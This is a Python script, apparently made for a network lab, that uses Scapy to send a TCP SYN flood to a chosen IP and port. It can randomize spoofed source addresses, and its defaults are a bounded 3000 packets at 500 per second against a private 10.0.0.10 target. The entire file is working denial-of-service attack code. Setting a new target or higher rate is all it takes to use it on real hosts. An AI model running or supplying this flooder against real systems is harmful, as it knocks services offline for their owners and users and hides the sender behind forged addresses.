#!/usr/bin/env python3
"""Scapy SYN flood generator with bounded defaults."""

from __future__ import annotations

import argparse
import random
import time

from scapy.all import IP, TCP, RandShort, send  # type: ignore


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Netlab Scapy SYN flood")
    p.add_argument("--target-ip", default="10.0.0.10")
    p.add_argument("--target-port", type=int, default=80)
    p.add_argument("--count", type=int, default=3000)
    p.add_argument("--pps", type=int, default=500)
    p.add_argument("--spoof", action="store_true", help="Randomize source IPs")
    return p.parse_args()


def random_ipv4() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def main() -> None:
    args = parse_args()
    delay = 1.0 / max(args.pps, 1)

    print(
        f"[syn-flood] target={args.target_ip}:{args.target_port} count={args.count} "
        f"pps={args.pps} spoof={args.spoof}"
    )

    for i in range(args.count):
        src_ip = random_ipv4() if args.spoof else "10.0.0.2"
        pkt = IP(src=src_ip, dst=args.target_ip) / TCP(
            sport=RandShort(),
            dport=args.target_port,
            flags="S",
            seq=random.randint(0, 2**32 - 1),
        )
        send(pkt, verbose=False)
        if i % 200 == 0 and i != 0:
            print(f"[syn-flood] sent {i} packets")
        time.sleep(delay)

    print("[syn-flood] done")


if __name__ == "__main__":
    main()
